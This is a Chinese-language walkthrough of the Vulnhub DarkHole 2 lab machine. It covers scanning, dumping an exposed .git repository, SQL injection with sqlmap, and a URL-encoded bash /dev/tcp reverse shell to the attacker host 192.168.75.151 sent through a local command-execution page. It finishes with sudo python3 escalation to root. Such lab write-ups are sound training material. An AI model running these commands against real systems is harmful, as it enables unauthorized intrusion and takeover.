---
title: Vulnhub-DarkHole 2
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# DarkHole: 2

> https://www.vulnhub.com/entry/darkhole-2,740/
> 

## 端口扫描主机发现

1. 探测存活主机，`185`是靶机
    
    ```php
    # nmap -sP 192.168.75.0/24                 
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 18:02 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00036s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00030s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.185
    Host is up (0.00028s latency).
    MAC Address: 00:0C:29:1E:D3:AD (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00033s latency).
    MAC Address: 00:50:56:FE:CA:7A (VMware)
    Nmap scan report for 192.168.75.151
    ```
    
2. 探测主机所有开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.185
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 18:03 CST
    Nmap scan report for 192.168.75.185
    Host is up (0.00040s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 00:0C:29:1E:D3:AD (VMware)
    ```
    
3. 探测服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p 80,22 192.168.75.185    
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 18:04 CST
    Nmap scan report for 192.168.75.185
    Host is up (0.00067s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    MAC Address: 00:0C:29:1E:D3:AD (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 4.X|5.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
    OS details: Linux 4.15 - 5.8
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```python
    nmap -script=vuln -p 80,22 192.168.75.185
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 18:05 CST
    Nmap scan report for 192.168.75.185
    Host is up (0.00078s latency).
    
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    | http-git: 
    |   192.168.75.185:80/.git/
    |     Git repository found!
    |     Repository description: Unnamed repository; edit this file 'description' to name the...
    |_    Last commit message: i changed login.php file for more secure 
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    | http-csrf: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.185
    |   Found the following possible CSRF vulnerabilities: 
    |     
    |     Path: http://192.168.75.185:80/login.php
    |     Form id: email
    |_    Form action: 
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |       httponly flag not set
    |   /login.php: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-enum: 
    |   /login.php: Possible admin folder
    |   /.git/HEAD: Git folder
    |   /config/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
    |   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
    |_  /style/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
    ```
    
    找到`.git` ，可能存在源码泄露
    

## web渗透

1. 访问主页，存在登陆页面连接
    
    ![image.png](image%2076.png)
    
2. 扫描目录
    
    ```python
    dirsearch -u http://192.168.75.185 -x 403,404
    //
    [18:11:11] 301 -  313B  - /js  ->  http://192.168.75.185/js/                                             
    [18:11:13] 301 -  315B  - /.git  ->  http://192.168.75.185/.git/                                         
    [18:11:13] 200 -  600B  - /.git/                                                                         
    [18:11:13] 200 -   41B  - /.git/COMMIT_EDITMSG      
    [18:11:13] 200 -   73B  - /.git/description                                                              
    [18:11:13] 200 -   23B  - /.git/HEAD                
    [18:11:13] 200 -  674B  - /.git/hooks/              
    [18:11:13] 200 -  130B  - /.git/config                                                                   
    [18:11:13] 200 -    1KB - /.git/index                                                                    
    [18:11:13] 200 -  460B  - /.git/info/                                                                    
    [18:11:13] 200 -  240B  - /.git/info/exclude        
    [18:11:13] 200 -  485B  - /.git/logs/                                                                    
    [18:11:13] 200 -  554B  - /.git/logs/HEAD           
    [18:11:13] 301 -  331B  - /.git/logs/refs/heads  ->  http://192.168.75.185/.git/logs/refs/heads/
    [18:11:13] 200 -  554B  - /.git/logs/refs/heads/master                                                   
    [18:11:13] 200 -  669B  - /.git/objects/                                                                 
    [18:11:13] 301 -  325B  - /.git/logs/refs  ->  http://192.168.75.185/.git/logs/refs/                     
    [18:11:13] 200 -   41B  - /.git/refs/heads/master                                                        
    [18:11:13] 301 -  326B  - /.git/refs/heads  ->  http://192.168.75.185/.git/refs/heads/                   
    [18:11:13] 301 -  325B  - /.git/refs/tags  ->  http://192.168.75.185/.git/refs/tags/                     
    [18:11:13] 200 -  465B  - /.git/refs/               
    [18:11:13] 200 -  510B  - /.idea/                                                                        
    [18:11:13] 301 -  316B  - /.idea  ->  http://192.168.75.185/.idea/                                       
    [18:11:14] 200 -  192B  - /.idea/modules.xml                                                             
    [18:11:14] 200 -  926B  - /.idea/workspace.xml                                                           
    [18:11:32] 301 -  317B  - /config  ->  http://192.168.75.185/config/                                     
    [18:11:33] 200 -  457B  - /config/                                                                       
    [18:11:34] 200 -   11B  - /dashboard.php                                                                 
    [18:11:43] 200 -  456B  - /js/                                                                           
    [18:11:45] 200 -  484B  - /login.php                                                                     
    [18:11:46] 302 -    0B  - /logout.php  ->  index.php                                                     
    [18:12:03] 301 -  316B  - /style  ->  http://192.168.75.185/style/
    ```
    
    - 清一色的`.git` 可以尝试有没有`.git`源码泄露
    - `config/` 应该是配置文件
3. 测试是否存在源码泄露
    
    > https://www.freebuf.com/articles/web/346607.html
    > 
    
    因为我们找到了`.git` ,所以我们要针对`git`
    
    - 访问`/.git/config` 存在该目录，存在源码泄露漏洞
        
        ```python
        [core]
        	repositoryformatversion = 0
        	filemode = false
        	bare = false
        	logallrefupdates = true
        	symlinks = false
        	ignorecase = true
        ```
        
    - 使用工具 **`git-dumper`**
        
        > https://github.com/arthaud/git-dumper
        > 
        
        使用`pip install git-dumper` 安装
        
        ```python
        git-dumper http://192.168.75.185/.git/ ./185
        ```
        
        将所有源码文件下载下来了，下载到当前目录的`185`文件夹里
        
        ```python
        ls -al ./185
        //
        drwxr-xr-x 7 root root 4096 11月 9日 01:25 .
        drwxr-xr-x 4 root root 4096 11月 9日 01:41 ..
        drwxr-xr-x 2 root root 4096 11月 9日 01:25 config
        -rw-r--r-- 1 root root 5578 11月 9日 01:25 dashboard.php
        drwxr-xr-x 7 root root 4096 11月 9日 01:25 .git
        drwxr-xr-x 2 root root 4096 11月 9日 01:25 .idea
        -rw-r--r-- 1 root root 1094 11月 9日 01:25 index.php
        drwxr-xr-x 2 root root 4096 11月 9日 01:25 js
        -rw-r--r-- 1 root root 1493 11月 9日 01:25 login.php
        -rw-r--r-- 1 root root  179 11月 9日 01:25 logout.php
        drwxr-xr-x 2 root root 4096 11月 9日 01:25 style
        ```
        

## 代码审计

上面已将源码文件下载了，现在开始要代码审计

1. `config.php`文件，是数据库配置文件，用户名为`root`但是密码为`空`
    
    ```python
    <?php
    $connect = new mysqli("localhost","root","","darkhole_2");
    ```
    
2. `login.php` 
    
    ```python
    <?php                                                                                                                                                                                                             
    session_start();                                                                                                                                                                                                  
    require 'config/config.php';                                                                                                                                                                                      
    if($_SERVER['REQUEST_METHOD'] == 'POST'){                                                                                                                                                                         
        $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST['email']));                                                                                                                               
        $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST['password']));                                                                                                                             
        $check = $connect->query("select * from users where email='$email' and password='$pass' and id=1");                                                                                                           
        if($check->num_rows){
            $_SESSION['userid'] = 1;
            header("location:dashboard.php");
            die();
        }
    }
    ?>
    ```
    
    应该是可以绕过的？但是我没有成功
    
3. 进入`185`文件夹查看日志（因为文件夹还留着`.git` ,所以可以使用`git`命令）
    
    ```python
    git log
    //                                     
    commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -> master)
    Author: Jehad Alqurashi <anmar-v7@hotmail.com>
    Date:   Mon Aug 30 13:14:32 2021 +0300
    
        i changed login.php file for more secure
    
    commit a4d900a8d85e8938d3601f3cef113ee293028e10
    Author: Jehad Alqurashi <anmar-v7@hotmail.com>
    Date:   Mon Aug 30 13:06:20 2021 +0300
    
        I added login.php file with default credentials
    
    commit aa2a5f3aa15bb402f2b90a07d86af57436d64917
    Author: Jehad Alqurashi <anmar-v7@hotmail.com>
    Date:   Mon Aug 30 13:02:44 2021 +0300
    ```
    
    出现三次提交以及作者时间等
    
4. 对比三次提交
    
    > `git diff` #获得当前目录上次提交和本地索引的差距,也就是你在什么地方修改了代码.
    > 
    
    ```python
    # git diff 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4                                                                                                                     
    # git diff a4d900a8d85e8938d3601f3cef113ee293028e10
    
    diff --git a/login.php b/login.php
    index 8a0ff67..0904b19 100644
    --- a/login.php
    +++ b/login.php
    @@ -2,7 +2,10 @@
     session_start();
     require 'config/config.php';
     if($_SERVER['REQUEST_METHOD'] == 'POST'){
    -    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
    +    $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST['email']));
    +    $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST['password']));
    +    $check = $connect->query("select * from users where email='$email' and password='$pass' and id=1");
    +    if($check->num_rows){
             $_SESSION['userid'] = 1;
             header("location:dashboard.php");
             die();
    
    ```
    
    可以看到 `-    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321")`
    
    出现了邮箱以及密码，可以尝试登陆后台
    
5. 使用的得到账号密码登录后台，成功进入

## 利用后台

1. 使用的得到账号密码登录后台，成功进入后台
    
    ![image.png](image%2077.png)
    
2. `url`是`/dashboard.php?id=1` ，像是存在`sql`注入，可以尝试下
    
    ```python
    /dashboard.php?id=1' # 页面空白
    /dashboard.php?id=1'--+ # 成功闭合，存在注入
    ```
    
    就不使用手工注入了，直接上`sqlmap` ，记得要想拿到`cookie` ，不然没有登陆状态
    
    ```python
    sqlmap -u http://192.168.75.185/dashboard.php?id=1 --cookie PHPSESSID=n22sg8e16sjbgs2c7g7kffofmf -batch
    ```
    
    爆出两张表 `users` 以及`ssh` ，`ssh`应该是能使用 `ssh`登录的用户，两张表的数据我们都`dump`下
    
    ```python
    # users
    +----+----------------+-------------------------------------------+----------+-----------------------------+----------------+
    | id | email          | address                                   | password | username                    | contact_number |
    +----+----------------+-------------------------------------------+----------+-----------------------------+----------------+
    | 1  | lush@admin.com |  Street, Pincode, Province/State, Country | 321      | Jehad Alqurashiasddasdasdas | 1              |
    +----+----------------+-------------------------------------------+----------+-----------------------------+----------------+
    # ssh
    +----+------+--------+
    | id | pass | user   |
    +----+------+--------+
    | 1  | fool | jehad  |
    +----+------+--------+
    ```
    
3. 我们拿`ssh`表的用户去登陆下

## 提权 - jehad用户

1. 我们拿`ssh`表的用户去登陆下
    
    ```python
    ssh jehad@192.168.75.185                
    jehad@darkhole:~$ 
    ```
    
    获得`shell`！！！
    
2. 查看权限
    
    ```python
    jehad@darkhole:~$ whoami
    jehad
    jehad@darkhole:~$ id
    uid=1001(jehad) gid=1001(jehad) groups=1001(jehad)
    jehad@darkhole:~$ uname -a
    Linux darkhole 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
    ```
    
3. 寻找敏感文件
    - `/home/losy` 目录下存在`user.txt` 是`flag`文件
        
        ```python
        ehad@darkhole:/home/losy$ cat user.txt
        DarkHole{'This_is_the_life_man_better_than_a_cruise'}
        ```
        
    - 寻找SUID文件
        
        ```python
        jehad@darkhole:/home/losy$ find / -perm -u=s -type f 2>/dev/null                                                                                                                                   02:06:46 [3/65]
        /usr/bin/sudo                                                                                                                                                                                                     
        /usr/bin/passwd                                                                                                                                                                                                   
        /usr/bin/chfn                                                                                                                                                                                                     
        /usr/bin/chsh
        /usr/bin/fusermount
        /usr/bin/gpasswd
        /usr/bin/pkexec
        /usr/bin/newgrp
        /usr/bin/umount
        /usr/bin/mount
        /usr/bin/su
        /usr/bin/at
        /usr/lib/openssh/ssh-keysign
        /usr/lib/dbus-1.0/dbus-daemon-launch-helper
        /usr/lib/policykit-1/polkit-agent-helper-1
        /usr/lib/eject/dmcrypt-get-device
        /usr/lib/snapd/snap-confine
        ```
        
        想尝试`snapd` 提权的，但是版本对不上
        
4. 查看`bash`历史记录
    
    ```python
    jehad@darkhole:~$ cat .bash_history 
    ```
    
    ![image.png](image%2078.png)
    
    发现执行了很多 `curl "http://127.0.0.1:9999/?cmd=<命令>"`  之类的，估计`9999`端口下是一个能进行`RCE`的页面
    
5. 我们也尝试执行下
    - 先试试`id` ，发现是`losy`的权限
        
        ```python
        jehad@darkhole:~$ curl http://127.0.0.1:9999/?cmd=id
        Parameter GET['cmd']uid=1002(losy) gid=1002(losy) groups=1002(losy)
        ```
        
6. 获得`losy`用户的权限
    - 跟着反弹shell命令
        
        因为靶机的`nc`没有`-e`参数，只能通过其他方式来反弹`shell`
        
        ```python
        # 通过shell
        bash -c 'bash -i >& /dev/tcp/192.168.75.151/1234 0>&1'
        ```
        
    - 将其进行URl编码
        
        ```python
        bash+-c+%27bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.75.151%2f1234+0%3e%261%27
        ```
        
    - 构建命令
        
        ```python
        curl "http://127.0.0.1:9999/?cmd=bash+-c+%27bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.75.151%2f1234+0%3e%261%27"
        ```
        
    - `kali` 开启监听，执行命令
        
        ```python
        nc -lvp 1234
        listening on [any] 1234 ...
        192.168.75.185: inverse host lookup failed: Unknown host
        connect to [192.168.75.151] from (UNKNOWN) [192.168.75.185] 33342
        bash: cannot set terminal process group (1215): Inappropriate ioctl for device
        bash: no job control in this shell
        losy@darkhole:/opt/web$ 
        ```
        
        获得`losy`的`shell`！！！
        

## 提权 - losy用户

1. 和之前一样，我们先查看`bash`历史记录
    
    ![image.png](image%2079.png)
    
    可以找到`losy`的密码为`gang`
    
2. 进行`ssh`登录，能过得交互性更好的`shell`
3. 查看权限
    - `SUDO` ，可以以root权限执行`python3` ，可以提权了
        
        ```python
        ```python
        losy@darkhole:~$ sudo -l
        [sudo] password for losy: 
        Matching Defaults entries for losy on darkhole:
            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
        
        User losy may run the following commands on darkhole:
            (root) /usr/bin/python3
        ```
        ```
        
4. 使用`python3`提权，使用`python`生成虚拟终端即可
    
    ```python
    losy@darkhole:~$ sudo /usr/bin/python3 -c "import pty;pty.spawn('/bin/sh')"
    # whoami
    root
    ```
    
    获得`root`！！！！
    
5. 读取`flag`文件
    
    ```python
    # cat root.txt
    DarkHole{'Legend'}
    ```
    

## 总结

`.git`的使用，以及`git diff`；以及`bash_history`也可能存在敏感内容；